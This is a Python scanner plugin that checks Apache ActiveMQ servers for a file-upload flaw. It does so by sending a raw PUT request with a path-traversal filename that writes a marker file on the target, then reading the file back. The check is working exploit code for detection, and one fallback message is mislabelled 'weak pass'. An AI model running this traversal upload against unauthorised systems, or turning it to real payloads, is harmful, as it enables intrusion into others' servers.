# -*- coding:utf-8 -*-

import socket
import time
import requests
import random


def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH1234567890"))
    return str1

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if activemq upload file vul')
    try:
        socket.setdefaulttimeout(4)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        filename = random_str(6)
        flag = "PUT /fileserver/sex../../..\\styles/%s.txt HTTP/1.0\r\nContent-Length: 9\r\n\r\nxxscan0\r\n\r\n"%(filename)
        flag = flag.encode(encoding='utf-8')
        s.send(flag)
        time.sleep(2)
        s.recv(1024)
        s.close()
        url = 'http://' + ip + ":" + str(port) + '/styles/%s.txt'%(filename)
        res_html = requests.get(url, verify=False,timeout=4).text
        if 'xxscan0' in res_html:
            msg = 'There is activemq upload file vul on url: ' +url+ ' .'
            number = 'v47'
            return True,url,number,msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no activemq weak pass vul'
    number = 'v0'
    return False,url,number,msg
